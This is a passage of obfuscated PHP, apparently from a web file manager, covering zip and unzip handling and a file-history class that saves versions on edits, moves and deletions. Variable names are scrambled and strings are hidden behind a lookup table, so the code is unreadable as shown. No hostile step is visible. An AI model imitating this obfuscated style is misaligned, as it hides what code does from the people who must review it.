($áÄÀşèÕ) { return $áÄÀşèÕ; } $ÊïÉÉ– = IO::init($_SERVER[™¸œØ®Ü][8]); return $ÊïÉÉ–; } private static function iconvSystem($ÒÚî) { return self::local()->iconvSystem($ÒÚî); } private static function iconvApp($šÜá°Á) { return self::local()->iconvApp($šÜá°Á); } public static function zipFolder($­Á›ª´ğ, $İâñóæ± = "\x7a\151\160", $İş¿Üì = '', $ œŠÌÁš = REPEAT_RENAME) { $¯Œ¼¥ =& $_SERVER[™¸œØ®Ü]; $Ë£Ê´ş = IO::listPath($­Á›ª´ğ); if (!$Ë£Ê´ş) { return !1; } $Ë£Ê´ş = array_merge($Ë£Ê´ş[$¯Œ¼¥[85]], $Ë£Ê´ş[$¯Œ¼¥[86]]); return self::zip($Ë£Ê´ş, $İâñóæ±, $İş¿Üì, $ œŠÌÁš); } public static function zip($¯œÎŸé, $Ûœğƒ†– = "\172\x69\160", $•´õûèî = '', $“ì²ï‚¥ = REPEAT_RENAME) { $¾İµÎ”Ö =& $_SERVER[™¸œØ®Ü]; if (is_string($¯œÎŸé) && $¯œÎŸé) { $¯œÎŸé = array(array($¾İµÎ”Ö[87] => $¯œÎŸé)); } $÷æâ‘¥ñ = self::init($¯œÎŸé[0][$¾İµÎ”Ö[87]]); $½Ş°Åì¦ = self::info($¯œÎŸé[0][$¾İµÎ”Ö[87]]); $ÅâÎĞÏ = $¾İµÎ”Ö[12]; $øöŞ—ş = $¾İµÎ”Ö[12]; $†·ò€•Ÿ = $¾İµÎ”Ö[12]; if ($•´õûèî && substr($•´õûèî, -1, 1) != $¾İµÎ”Ö[8]) { $øöŞ—ş = get_path_father($•´õûèî); $†·ò€•Ÿ = get_path_this($•´õûèî); } else { $øöŞ—ş = self::pathFather($½Ş°Åì¦[$¾İµÎ”Ö[87]]); $†·ò€•Ÿ = $½Ş°Åì¦[$¾İµÎ”Ö[32]] . $¾İµÎ”Ö[10] . $Ûœğƒ†–; if (count($¯œÎŸé) > 1) { $ôèğ“±ä = IO::info($øöŞ—ş); $†·ò€•Ÿ = $ôèğ“±ä[$¾İµÎ”Ö[32]] . $¾İµÎ”Ö[10] . $Ûœğƒ†–; } if ($•´õûèî) { $øöŞ—ş = $•´õûèî; } } if ($÷æâ‘¥ñ->getType() == $¾İµÎ”Ö[109]) { $šİ¦ÕŸ¬ = self::init($øöŞ—ş); $ŸÙÀù  = $šİ¦ÕŸ¬->getType() == $¾İµÎ”Ö[109] ? $øöŞ—ş : get_path_father($÷æâ‘¥ñ->path); $ŸÙÀù  = IO::getPathInner($ŸÙÀù ); $ŸÙÀù  = rtrim($ŸÙÀù , $¾İµÎ”Ö[8]) . $¾İµÎ”Ö[8]; mk_dir($ŸÙÀù ); } else { $ÅâÎĞÏ = TEMP_FILES . $¾İµÎ”Ö[1284] . time() . rand_string(8) . $¾İµÎ”Ö[8]; mk_dir($ÅâÎĞÏ); file_put_contents($ÅâÎĞÏ . $¾İµÎ”Ö[1285], $¾İµÎ”Ö[12]); $ŸÙÀù  = $ÅâÎĞÏ; } $¼ÔáºÕ© = IO::info($ŸÙÀù ); if (!$¼ÔáºÕ© || !$¼ÔáºÕ©[$¾İµÎ”Ö[235]]) { show_json(LNG($¾İµÎ”Ö[1286]), !1); } $¸„ª¥ = self::zipFileList($¯œÎŸé, $ÅâÎĞÏ); foreach ($¸„ª¥ as $˜®…±Ï => $¨®µêŸÆ) { $¸„ª¥[$˜®…±Ï] = self::iconvSystem($¨®µêŸÆ); } $òç©“Ó = get_filename_auto($ŸÙÀù  . $†·ò€•Ÿ, $¾İµÎ”Ö[12], $“ì²ï‚¥); KodArchive::create(self::iconvSystem($òç©“Ó), $¸„ª¥); if (!IO::exist($òç©“Ó)) { if ($ÅâÎĞÏ) { del_dir($ÅâÎĞÏ); } write_log($¾İµÎ”Ö[1287] . $òç©“Ó, $¾İµÎ”Ö[390]); show_json(LNG($¾İµÎ”Ö[1288]), !1); } if (!$ÅâÎĞÏ) { return $òç©“Ó; } $ñŠíû¼ = self::move($òç©“Ó, $øöŞ—ş, $“ì²ï‚¥); if ($ÅâÎĞÏ) { del_dir($ÅâÎĞÏ); } if (!$òç©“Ó) { write_log($¾İµÎ”Ö[1289] . $òç©“Ó . $¾İµÎ”Ö[1290] . $øöŞ—ş, $¾İµÎ”Ö[390]); show_json(LNG($¾İµÎ”Ö[1288]), !1); } return $ñŠíû¼; } public static function unzip($ä¤„òÏã, $Ä½¬›‹, $®®¡Á»õ = "\55\61", $ı¢²ïê = "\162\145\x70\x6c\x61\143\145") { $º©Ø¢ÔË =& $_SERVER[™¸œØ®Ü]; $ª³ˆÃá = parent::info($ä¤„òÏã); if (!$ª³ˆÃá) { show_json(LNG($º©Ø¢ÔË[1291]), !1); } $¾öÃÍäÁ = IO::infoFullSimple($Ä½¬›‹); if (!$¾öÃÍäÁ) { $Ä½¬›‹ = IO::mkdir($Ä½¬›‹); } if (isset($¾öÃÍäÁ[$º©Ø¢ÔË[193]]) && trim($¾öÃÍäÁ[$º©Ø¢ÔË[87]], $º©Ø¢ÔË[8]) != trim($Ä½¬›‹, $º©Ø¢ÔË[8])) { $É×ÊÕ¿Ğ = KodIO::make($¾öÃÍäÁ[$º©Ø¢ÔË[192]]); $¶şü£·© = IO::fileNameAuto($É×ÊÕ¿Ğ, $¾öÃÍäÁ[$º©Ø¢ÔË[32]], REPEAT_RENAME_FOLDER, !0); $Ä½¬›‹ = IO::mkdir($É×ÊÕ¿Ğ . $¶şü£·©); } $®®¡Á»õ = $®®¡Á»õ && $®®¡Á»õ != $º©Ø¢ÔË[1292] ? @json_decode($®®¡Á»õ, !0) : -1; $Œªò™¿æ = self::unzipPart($ä¤„òÏã, $®®¡Á»õ); if (!$Œªò™¿æ || !IO::exist($Œªò™¿æ[$º©Ø¢ÔË[232]])) { show_json(LNG($º©Ø¢ÔË[108]), !1); } $»Ëë×Úš = $Œªò™¿æ[$º©Ø¢ÔË[1293]][count($Œªò™¿æ[$º©Ø¢ÔË[1293]]) - 1]; if ($»Ëë×Úš[$º©Ø¢ÔË[1294]] == -1 || substr($»Ëë×Úš[$º©Ø¢ÔË[32]], -1, 1) == $º©Ø¢ÔË[8]) { $åØöÆÌ = $Œªò™¿æ[$º©Ø¢ÔË[1295]] . rand_string(10) . $º©Ø¢ÔË[8]; mk_dir($åØöÆÌ); $ÍŞìÜÓÕ = count($Œªò™¿æ[$º©Ø¢ÔË[1293]]) == 1 ? IO::ext($ä¤„òÏã) : get_path_ext($Œªò™¿æ[$º©Ø¢ÔË[232]]); $Ó£½‘È = KodArchive::extract(self::iconvSystem($Œªò™¿æ[$º©Ø¢ÔË[232]]), $åØöÆÌ, $»Ëë×Úš[$º©Ø¢ÔË[1294]], $¶şü£·©, $ÍŞìÜÓÕ); self::unzipErrorCheck($Ó£½‘È, array($º©Ø¢ÔË[1296], $ä¤„òÏã, $ÍŞìÜÓÕ, $Ä½¬›‹, $Œªò™¿æ)); Hook::trigger($º©Ø¢ÔË[1297], $åØöÆÌ); recursion_dir($åØöÆÌ, $ğÊÑˆ½£, $Ÿéš—ä­, 0); $ú²Œ†ë¨ = array_merge($ğÊÑˆ½£, $Ÿéš—ä­); $¢î¥ÆŒ‚ = array(); foreach ($ú²Œ†ë¨ as $ÖÜÅæ¶) { $ÀƒÖàÇÔ = IO::move(self::iconvApp($ÖÜÅæ¶), $Ä½¬›‹, $ı¢²ïê); if ($ÀƒÖàÇÔ) { $¢î¥ÆŒ‚[] = $ÀƒÖàÇÔ; } } del_dir($åØöÆÌ); } else { $ÀƒÖàÇÔ = IO::move($Œªò™¿æ[$º©Ø¢ÔË[232]], $Ä½¬›‹, $ı¢²ïê, get_path_this($»Ëë×Úš[$º©Ø¢ÔË[32]])); if ($ÀƒÖàÇÔ) { $¢î¥ÆŒ‚[] = $ÀƒÖàÇÔ; } } return $¢î¥ÆŒ‚ ? $¢î¥ÆŒ‚ : !1; } public static function unzipList($Ü°½¸”Ì) { $ÕÆñêóê =& $_SERVER[™¸œØ®Ü]; $ÄÓùš‹ä = isset($Ü°½¸”Ì[$ÕÆñêóê[1298]]) ? $Ü°½¸”Ì[$ÕÆñêóê[1298]] : !1; $Æ¦ØÔğƒ = isset($Ü°½¸”Ì[$ÕÆñêóê[1294]]) ? @json_decode($Ü°½¸”Ì[$ÕÆñêóê[1294]], !0) : -1; $š†Ø‘š = self::unzipPart($Ü°½¸”Ì[$ÕÆñêóê[87]], $Æ¦ØÔğƒ); if (!$š†Ø‘š || !IO::exist($š†Ø‘š[$ÕÆñêóê[232]])) { show_json(LNG($ÕÆñêóê[108]), !1); } $¢ğÅ´Ö÷ = $š†Ø‘š[$ÕÆñêóê[1293]][count($š†Ø‘š[$ÕÆñêóê[1293]]) - 1]; $Ó•è¾† = in_array(IO::ext($š†Ø‘š[$ÕÆñêóê[232]]), array($ÕÆñêóê[390], $ÕÆñêóê[1299], $ÕÆñêóê[1300], $ÕÆñêóê[1301], $ÕÆñêóê[1302], $ÕÆñêóê[1303])); if (!$ÄÓùš‹ä && ($¢ğÅ´Ö÷[$ÕÆñêóê[1294]] == -1 || $Ó•è¾†)) { $¯®Êİè· = $š†Ø‘š[$ÕÆñêóê[1295]] . get_path_this($š†Ø‘š[$ÕÆñêóê[232]]) . $ÕÆñêóê[1304]; if (!IO::exist($¯®Êİè·)) { $‰€¨‹ƒë = $¢ğÅ´Ö÷[$ÕÆñêóê[1294]] == -1 ? get_path_ext(IO::pathThis($Ü°½¸”Ì[$ÕÆñêóê[87]])) : get_path_ext($š†Ø‘š[$ÕÆñêóê[232]]); $ÄÆã¸•Ó = KodArchive::listContent(self::iconvSystem($š†Ø‘š[$ÕÆñêóê[232]]), !0, $‰€¨‹ƒë); self::unzipErrorCheck($ÄÆã¸•Ó, array($ÕÆñêóê[1305], $Ü°½¸”Ì, $š†Ø‘š)); @file_put_contents($¯®Êİè·, json_encode($ÄÆã¸•Ó[$ÕÆñêóê[1306]])); } return @json_decode(IO::getContent($¯®Êİè·), !0); } IO::fileOut($š†Ø‘š[$ÕÆñêóê[232]], $ÄÓùš‹ä, get_path_this($¢ğÅ´Ö÷[$ÕÆñêóê[32]])); die; } private static function zipFileList($ó›Ñ¯‘¦, $ÑóÌºãï = false) { $ã”ìşáÔ =& $_SERVER[™¸œØ®Ü]; $´á£»éõ = array(); foreach ($ó›Ñ¯‘¦ as $°…™—°©) { $Ï²Äœ™ø = $°…™—°©[$ã”ìşáÔ[87]]; if ($ÑóÌºãï) { $Ï²Äœ™ø = self::copy($°…™—°©[$ã”ìşáÔ[87]], $ÑóÌºãï, $ã”ìşáÔ[909]); } else { $©”±Ùøş = self::init($°…™—°©[$ã”ìşáÔ[87]]); if ($©”±Ùøş->getType() == $ã”ìşáÔ[109]) { $Ï²Äœ™ø = $©”±Ùøş->path; } } if ($Ï²Äœ™ø && self::local()->exist($Ï²Äœ™ø)) { $´á£»éõ[$°…™—°©[$ã”ìşáÔ[87]]] = $Ï²Äœ™ø; } } if (!empty($´á£»éõ)) { return array_values($´á£»éõ); } show_json(LNG($ã”ìşáÔ[1265]), !1); } private static function localFilePath($¤®­¤×œ) { $ÛÍ›Ó²ˆ =& $_SERVER[™¸œØ®Ü]; $­Ô‰ëî = KodIO::parse($¤®­¤×œ); if ($­Ô‰ëî[$ÛÍ›Ó²ˆ[33]] == KodIO::KOD_SOURCE) { $†Ô‡¼×© = Model($ÛÍ›Ó²ˆ[915])->fileInfoGet(KodIO::sourceID($¤®­¤×œ)); if (!$†Ô‡¼×©[$ÛÍ›Ó²ˆ[87]]) { show_json($ÛÍ›Ó²ˆ[1307], !1); } $¤®­¤×œ = $†Ô‡¼×©[$ÛÍ›Ó²ˆ[87]]; } $û¿ÄÂÖ» = self::init($¤®­¤×œ); if ($û¿ÄÂÖ»->pathParse[$ÛÍ›Ó²ˆ[1251]]) { $¤®­¤×œ = $û¿ÄÂÖ»->pathParse[$ÛÍ›Ó²ˆ[1251]]; $û¿ÄÂÖ» = self::init($¤®­¤×œ); } $ößÃ®©Ô = $û¿ÄÂÖ»->getType(); if ($ößÃ®©Ô == $ÛÍ›Ó²ˆ[109] || $ößÃ®©Ô == $ÛÍ›Ó²ˆ[1308]) { if (!$û¿ÄÂÖ»->exist($û¿ÄÂÖ»->path)) { show_json(LNG($ÛÍ›Ó²ˆ[108]), !1); } return $û¿ÄÂÖ»->path; } return !1; } public static function unzipPart($°·éš¡ë, $Õ¸“½‰— = -1) { $ãâ¿õÓŞ =& $_SERVER[™¸œØ®Ü]; $Ì¹Ü¹Ë„ = IO::pathThis($°·éš¡ë); if (!$Õ¸“½‰— || $Õ¸“½‰— == -1) { $¹í”ÈÊŞ = array(array($ãâ¿õÓŞ[32] => $Ì¹Ü¹Ë„, $ãâ¿õÓŞ[1294] => -1)); $¹í”ÈÊŞ[0][$ãâ¿õÓŞ[1309]] = $¹í”ÈÊŞ[0][$ãâ¿õÓŞ[32]]; } else { if (is_array($Õ¸“½‰—)) { $¹í”ÈÊŞ = $Õ¸“½‰—; $ÔÈÙô¡Ô = count($¹í”ÈÊŞ) - 1; for ($µ±Şéğ = 0; $µ±Şéğ <= $ÔÈÙô¡Ô; $µ±Şéğ++) { $¨·èÅ¡È = $¹í”ÈÊŞ[$µ±Şéğ]; $ÂçÏ˜» = get_path_this($¨·èÅ¡È[$ãâ¿õÓŞ[32]]) . (checkExtSafe($¨·èÅ¡È[$ãâ¿õÓŞ[32]]) ? $ãâ¿õÓŞ[12] : $ãâ¿õÓŞ[1310]); $¹í”ÈÊŞ[$µ±Şéğ][$ãâ¿õÓŞ[1309]] = $ãâ¿õÓŞ[1311] . intval($¨·èÅ¡È[$ãâ¿õÓŞ[1294]]) . $ãâ¿õÓŞ[464] . $ÂçÏ˜»; if ($µ±Şéğ == 0) { continue; } $¹í”ÈÊŞ[$µ±Şéğ][$ãâ¿õÓŞ[1309]] = $¹í”ÈÊŞ[$µ±Şéğ - 1][$ãâ¿õÓŞ[1309]] . $ãâ¿õÓŞ[1312] . $¹í”ÈÊŞ[$µ±Şéğ][$ãâ¿õÓŞ[1309]]; } } } if (!is_array($¹í”ÈÊŞ) || count($¹í”ÈÊŞ) == 0) { return !1; } $¦¼½±‘« = $¹í”ÈÊŞ[count($¹í”ÈÊŞ) - 1]; if (!IO::exist($°·éš¡ë)) { return !1; } $å©­”¿ = TEMP_FILES . $ãâ¿õÓŞ[1313] . kodIO::hashPathSafe($°·éš¡ë) . $ãâ¿õÓŞ[8]; $¨¯€µ†Å = $å©­”¿ . $¦¼½±‘«[$ãâ¿õÓŞ[1309]]; mk_dir($å©­”¿); file_put_contents(TEMP_FILES . $ãâ¿õÓŞ[1285], $ãâ¿õÓŞ[12]); if (IO::exist($¨¯€µ†Å)) { return array($ãâ¿õÓŞ[232] => $¨¯€µ†Å, $ãâ¿õÓŞ[1293] => $¹í”ÈÊŞ, $ãâ¿õÓŞ[1295] => $å©­”¿); } $Ç¢º¼ì¾ = self::localFilePath($°·éš¡ë); if (!$Ç¢º¼ì¾) { $Ç¢º¼ì¾ = $å©­”¿ . $ãâ¿õÓŞ[1314]; if (!IO::exist($Ç¢º¼ì¾)) { self::copy($°·éš¡ë, $å©­”¿, !1, get_path_this($Ç¢º¼ì¾)); } } if (!$Ç¢º¼ì¾ || !IO::exist($Ç¢º¼ì¾)) { return !1; } if ($¦¼½±‘«[$ãâ¿õÓŞ[1294]] == -1) { return array($ãâ¿õÓŞ[232] => $Ç¢º¼ì¾, $ãâ¿õÓŞ[1293] => $¹í”ÈÊŞ, $ãâ¿õÓŞ[1295] => $å©­”¿); } $òêˆŒø€ = $Ç¢º¼ì¾; foreach ($¹í”ÈÊŞ as $µ±Şéğ => $¨·èÅ¡È) { if (!$¨·èÅ¡È || $¨·èÅ¡È[$ãâ¿õÓŞ[1294]] == $ãâ¿õÓŞ[1292]) { break; } if (substr($¨·èÅ¡È[$ãâ¿õÓŞ[32]], -1, 1) == $ãâ¿õÓŞ[8]) { break; } $ºÛ•áé¬ = in_array(get_path_ext($¨·èÅ¡È[$ãâ¿õÓŞ[1309]]), array($ãâ¿õÓŞ[390], $ãâ¿õÓŞ[1299], $ãâ¿õÓŞ[1300], $ãâ¿õÓŞ[1301], $ãâ¿õÓŞ[1302], $ãâ¿õÓŞ[1303])); $É³İÌ¨ = $µ±Şéğ == count($¹í”ÈÊŞ) - 1 && $ºÛ•áé¬; $†°‚ò’¬ = $å©­”¿ . $¨·èÅ¡È[$ãâ¿õÓŞ[1309]]; $ˆ˜şä¦Ö = $å©­”¿ . get_path_this($¨·èÅ¡È[$ãâ¿õÓŞ[32]]); if (IO::exist($†°‚ò’¬)) { $òêˆŒø€ = $†°‚ò’¬; continue; } $×Ş—¦‰¥ = $µ±Şéğ == 0 ? get_path_ext($Ì¹Ü¹Ë„) : get_path_ext($òêˆŒø€); $šÔäî÷¿ = KodArchive::extract(self::iconvSystem($òêˆŒø€), $å©­”¿, $¨·èÅ¡È[$ãâ¿õÓŞ[1294]], $«Â±µí†, $×Ş—¦‰¥); self::unzipErrorCheck($šÔäî÷¿, array($ãâ¿õÓŞ[1315], $°·éš¡ë, $¹í”ÈÊŞ, $¨·èÅ¡È, $†°‚ò’¬)); if (IO::exist($ˆ˜şä¦Ö)) { IO::rename($ˆ˜şä¦Ö, get_path_this($†°‚ò’¬)); } $òêˆŒø€ = $†°‚ò’¬; } $¨¯€µ†Å = $òêˆŒø€; return array($ãâ¿õÓŞ[232] => $òêˆŒø€, $ãâ¿õÓŞ[1293] => $¹í”ÈÊŞ, $ãâ¿õÓŞ[1295] => $å©­”¿); } private static function unzipErrorCheck($Ê¨ïœ ú, $à×¯ü’ = false) { $»Ò§ô²™ =& $_SERVER[™¸œØ®Ü]; if ($Ê¨ïœ ú[$»Ò§ô²™[1316]]) { return !0; } write_log(array($»Ò§ô²™[1317], $Ê¨ïœ ú, $à×¯ü’), $»Ò§ô²™[1318]); $˜…úÜ€ğ = is_array($Ê¨ïœ ú[$»Ò§ô²™[1306]]) ? json_encode($Ê¨ïœ ú[$»Ò§ô²™[1306]]) : $Ê¨ïœ ú[$»Ò§ô²™[1306]]; show_json($»Ò§ô²™[1319] . $˜…úÜ€ğ, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ğ×Øä¶ƒ =& $_SERVER[™¸œØ®Ü]; $¤”™Á’• = $GLOBALS[$ğ×Øä¶ƒ[6]][$ğ×Øä¶ƒ[92]]; if ($¤”™Á’•[$ğ×Øä¶ƒ[1320]] != 1) { return; } if ($¤”™Á’•[$ğ×Øä¶ƒ[1321]] <= 0) { return; } if (isset($_REQUEST[$ğ×Øä¶ƒ[1322]]) && $_REQUEST[$ğ×Øä¶ƒ[1322]] == $ğ×Øä¶ƒ[91]) { return; } Hook::bind($ğ×Øä¶ƒ[1323], $ğ×Øä¶ƒ[1324]); Hook::bind($ğ×Øä¶ƒ[1325], $ğ×Øä¶ƒ[1326]); Hook::bind($ğ×Øä¶ƒ[1327], $ğ×Øä¶ƒ[1328]); Hook::bind($ğ×Øä¶ƒ[1329], $ğ×Øä¶ƒ[1330]); Hook::bind($ğ×Øä¶ƒ[1331], $ğ×Øä¶ƒ[1332]); Hook::bind($ğ×Øä¶ƒ[1333], $ğ×Øä¶ƒ[1334]); } public static function eventBeforeUpload($Ú¦ã–³¶) { if ($Ú¦ã–³¶[3] && $Ú¦ã–³¶[3] != REPEAT_REPLACE) { return; } $õµÂ„ƒ« = self::parsePath($Ú¦ã–³¶[0]); if (!$õµÂ„ƒ«) { return; } self::add($õµÂ„ƒ«); } public static function eventBeforeEdit($ö¾ŞÔş™) { $™œäû  = self::parsePath($ö¾ŞÔş™[0]); if (!$™œäû ) { return; } self::add($™œäû ); } public static function eventBeforeCopyFile($ÂÕÓ‰’ü, $ä›ğÅÛš, $·ºŸÍ‹¥, $’¨¿­Â, $à½Õ…†½, $–Ç³¤Ñ) { $ŸÓ€××¡ =& $_SERVER[™¸œØ®Ü]; if (isset($·ºŸÍ‹¥->_data[$ŸÓ€××¡[1255]]) && $·ºŸÍ‹¥->_data[$ŸÓ€××¡[1255]]) { return; } $ØòèÑÛˆ = $·ºŸÍ‹¥->getPathOuter($’¨¿­Â); $¼Ì†¼Ğ = self::parsePath($ØòèÑÛˆ); if (!$¼Ì†¼Ğ) { return; } self::add($¼Ì†¼Ğ); } public static function eventBeforeRename($¼­›‘ü°) { $Ê¶™ë™ì =& $_SERVER[™¸œØ®Ü]; $Íª·Ø = self::parsePath($¼­›‘ü°[0]); if (!$Íª·Ø) { return; } $µ÷ºÂ¶Õ = self::checkInHistory($Íª·Ø); if (!$µ÷ºÂ¶Õ) { return; } if ($µ÷ºÂ¶Õ[$Ê¶™ë™ì[33]] == $Ê¶™ë™ì[232]) { $æíÍäùö = self::listData($Íª·Ø); if ($æíÍäùö && $æíÍäùö[$Ê¶™ë™ì[447]]) { self::moveHistory($Íª·Ø, $¼­›‘ü°[1]); } } else { IO::rename($µ÷ºÂ¶Õ[$Ê¶™ë™ì[87]], $¼­›‘ü°[1]); } } public static function eventBeforeMove($°·ÖÛœÖ) { $´İñãöœ =& $_SERVER[™¸œØ®Ü]; $÷É±™Ì = self::parsePath($°·ÖÛœÖ[0]); if (!$÷É±™Ì) { return; } $êÕ†–èâ = self::parsePath($°·ÖÛœÖ[1]); if (!$êÕ†–èâ) { return; } $¿äéÓ¥º = $°·ÖÛœÖ[3]; $ÏŠ¬ì£ = self::checkInHistory($÷É±™Ì); if (!$ÏŠ¬ì£) { return; } $Ğæ“”‹ò = self::pathHistory($êÕ†–èâ); if ($ÏŠ¬ì£[$´İñãöœ[33]] == $´İñãöœ[232]) { $ËÛ•Óç÷ = self::listData($÷É±™Ì); $Í±¼ŒÈ = rtrim($êÕ†–èâ, $´İñãöœ[8]) . $´İñãöœ[8] . ($¿äéÓ¥º ? $¿äéÓ¥º : get_path_this($÷É±™Ì)); $ô‘ŸÁÎù = self::listData($Í±¼ŒÈ); if ($ËÛ•Óç÷ && $ËÛ•Óç÷[$´İñãöœ[447]] && $ô‘ŸÁÎù && $ô‘ŸÁÎù[$´İñãöœ[447]]) { return self::clear($÷É±™Ì); } if ($ËÛ•Óç÷ && $ËÛ•Óç÷[$´İñãöœ[447]]) { self::moveHistory($÷É±™Ì, $¿äéÓ¥º, $Ğæ“”‹ò); } } else { IO::move($ÏŠ¬ì£[$´İñãöœ[87]], $Ğæ“”‹ò, !1, $¿äéÓ¥º); self::clearEmptyFolder(IO::pathFather($ÏŠ¬ì£[$´İñãöœ[87]])); } } public static function eventAfterRemove($ç ±”¾ª, $·›šÉ¦î) { $ïôÍÊâÌ =& $_SERVER[™¸œØ®Ü]; if (!$·›šÉ¦î) { return; } $ÓÊ‹²îª = self::parsePath($ç ±”¾ª[0]); if (!$ÓÊ‹²îª) { return; } $¼×ÚÄ£ˆ = self::checkInHistory($ÓÊ‹²îª); if (!$¼×ÚÄ£ˆ) { return; } if ($¼×ÚÄ£ˆ[$ïôÍÊâÌ[33]] == $ïôÍÊâÌ[232]) { $èÅóÁ¬Æ = self::listData($ÓÊ‹²îª, !1); if ($èÅóÁ¬Æ && $èÅóÁ¬Æ[$ïôÍÊâÌ[447]]) { self::clear($ÓÊ‹²îª, !1); } } else { IO::remove($¼×ÚÄ£ˆ[$ïôÍÊâÌ[87]]); self::clearEmptyFolder(IO::pathFather($¼×ÚÄ£ˆ[$ïôÍÊâÌ[87]])); } } private static function checkInHistory($åÃíÄÕ) { $Âış‡½° = self::pathHistory($åÃíÄÕ); if (!IO::exist($Âış‡½°)) { $Âış‡½° .= $_SERVER[™¸œØ®Ü][1335]; } return IO::exist($Âış‡½°) ? IO::info($Âış‡½°) : !1; } private static function parsePath($¸Á›ú¡È) { $¼µ÷ÖÕË =& $_SERVER[™¸œØ®Ü]; if (!$¸Á›ú¡È) { return !1; } if (isset($GLOBALS[$¼µ÷ÖÕË[1336]]) && $GLOBALS[$¼µ÷ÖÕË[1336]]) { return; } $ğ¦õ×Ìâ = KodIO::parse($¸Á›ú¡È); $î†Å« = $ğ¦õ×Ìâ[$¼µ÷ÖÕË[33]]; $ª¨¦èïª = !$î†Å« || $î†Å« == KodIO::KOD_IO || $î†Å« == KodIO::KOD_SHARE_ITEM; if (!$ª¨¦èïª || !$ğ¦õ×Ìâ[$¼µ÷ÖÕË[1337]]) { return !1; } if (substr($¸Á›ú¡È, 0, strlen(DATA_PATH . $¼µ÷ÖÕË[1338])) == DATA_PATH . $¼µ÷ÖÕË[1338]) { return !1; } if ($î†Å« == KodIO::KOD_SHARE_ITEM) { $›£ÂáÍ° = IO::init($¸Á›ú¡È); if ($›£ÂáÍ°->pathParse[$¼µ÷ÖÕË[1251]]) { return self::parsePath($›£ÂáÍ°->pathParse[$¼µ÷ÖÕË[1251]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $•ıÈ§ÄÄ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¼µ÷ÖÕË[1339]); foreach ($•ıÈ§ÄÄ as $é”Ñ•«) { if (!$î†Å« && substr($¸Á›ú¡È, 0, strlen($é”Ñ•«)) == $é”Ñ•«) { return !1; } } self::log($GLOBALS[$¼µ÷ÖÕË[1246]] . $¼µ÷ÖÕË[1340] . $¸Á›ú¡È); return $¸Á›ú¡È; } private static function pathHistory($Óú„ê¿) { $ÓÊ¶£‹ö =& $_SERVER[™¸œØ®Ü]; $¸„öÓé = self::$_historyBase . ltrim(KodIO::clear($Óú„ê¿), $ÓÊ¶£‹ö[8]); $¸„öÓé = str_replace(array($ÓÊ¶£‹ö[1341]), array($ÓÊ¶£‹ö[1342]), $¸„öÓé); return $¸„öÓé; } public static function log($İÓÌµø¼) { } public static function historyCount($úÄ˜š§º) { $ş‹¸ş“ =& $_SERVER[™¸œØ®Ü]; $¤¸Œú´Ö = array(); $…ú¥×Ø† = array(); foreach ($úÄ˜š§º as $Ü¥‹Î®) { $îÁëúĞø = get_path_father($Ü¥‹Î®); if (!$…ú¥×Ø†[$îÁëúĞø]) { $…ú¥×Ø†[$îÁëúĞø] = array(); } $…ú¥×Ø†[$îÁëúĞø][] = get_path_this($Ü¥‹Î®); } foreach ($…ú¥×Ø† as $îÁëúĞø => $¸‹±¾•¶) { $àäÌÄŞ‰ = self::parsePath($îÁëúĞø); if (!$àäÌÄŞ‰) { continue; } foreach ($¸‹±¾•¶ as $Åğå¡Ó™) { $Ìõ€¨ı‰ = self::listData(rtrim($àäÌÄŞ‰, $ş‹¸ş“[8]) . $ş‹¸ş“[8] . $Åğå¡Ó™, !1); if ($Ìõ€¨ı‰ && $Ìõ€¨ı‰[$ş‹¸ş“[447]]) { $¤¸Œú´Ö[rtrim($îÁëúĞø, $ş‹¸ş“[8]) . $ş‹¸ş“[8] . $Åğå¡Ó™] = count($Ìõ€¨ı‰[$ş‹¸ş“[447]]); } } } return $¤¸Œú´Ö; } public static function add($¹é–¹¶) { $Âï¢¸ˆ¸ =& $_SERVER[™¸œØ®Ü]; $Šã‹‘Â© = self::listData($¹é–¹¶); if (!$Šã‹‘Â©) { return; } $…¢Ø˜›² = Model($Âï¢¸ˆ¸[855])->get($Âï¢¸ˆ¸[1343]); $‡âÈºÉ¼ = intval($GLOBALS[$Âï¢¸ˆ¸[6]][$Âï¢¸ˆ¸[92]][$Âï¢¸ˆ¸[1321]]); $”¤´‡ó = $…¢Ø˜›² == $Âï¢¸ˆ¸[1344] ? min(5, $‡âÈºÉ¼) : $‡âÈºÉ¼; if ($‡âÈºÉ¼ <= 0) { return; } $ ÔÈ—üô = IO::info($¹é–¹¶); $³Â€Ã = $Šã‹‘Â©[$Âï¢¸ˆ¸[447]]; if ($ ÔÈ—üô[$Âï¢¸ˆ¸[79]] == 0) { return; } if ($ ÔÈ—üô[$Âï¢¸ˆ¸[79]] >= 1024 * 1024 * 500) { return !1; } $…¸Ïö = IO::hashSimple($¹é–¹¶); if ($³Â€Ã && $³Â€Ã[0][$Âï¢¸ˆ¸[679]] == $…¸Ïö) { return !0; } if (array_key_exists($Âï¢¸ˆ¸[235], $ ÔÈ—üô) && !$ ÔÈ—üô[$Âï¢¸ˆ¸[235]]) { return !1; } $–­àÜ×• = short_id(time()); $ö°í²µ = array($Âï¢¸ˆ¸[477] => $–­àÜ×•, $Âï¢¸ˆ¸[679] => $…¸Ïö, $Âï¢¸ˆ¸[32] => $ ÔÈ—üô[$Âï¢¸ˆ¸[32]] . $Âï¢¸ˆ¸[10] . date($Âï¢¸ˆ¸[1345]) . rand_string(1), $Âï¢¸ˆ¸[79] => $ ÔÈ—üô[$Âï¢¸ˆ¸[79]], $Âï¢¸ˆ¸[529] => USER_ID, $Âï¢¸ˆ¸[233] => time(), $Âï¢¸ˆ¸[1346] => $Âï¢¸ˆ¸[12]); IO::mkdir($Šã‹‘Â©[$Âï¢¸ˆ¸[1347]]); $¿¬¾Ï† = IO::copy($¹é–¹¶, $Šã‹‘Â©[$Âï¢¸ˆ¸[1347]], !1, $ö°í²µ[$Âï¢¸ˆ¸[32]]); if (!$¿¬¾Ï†) { self::clearEmptyFolder($Šã‹‘Â©[$Âï¢¸ˆ¸[1347]]); return !1; } array_unshift($³Â€Ã, $ö°í²µ); if (count($³Â€Ã) > $”¤´‡ó) { $áËÅÖ±ò = array_slice($³Â€Ã, $”¤´‡ó); foreach ($áËÅÖ±ò as $âĞ®Éµ) { IO::remove($Šã‹‘Â©[$Âï¢¸ˆ¸[1347]] . $âĞ®Éµ[$Âï¢¸ˆ¸[32]]); } $³Â€Ã = array_slice($³Â€Ã, 0, $”¤´‡ó); } return self::saveData($Šã‹‘Â©[$Âï¢¸ˆ¸[1348]], $³Â€Ã); 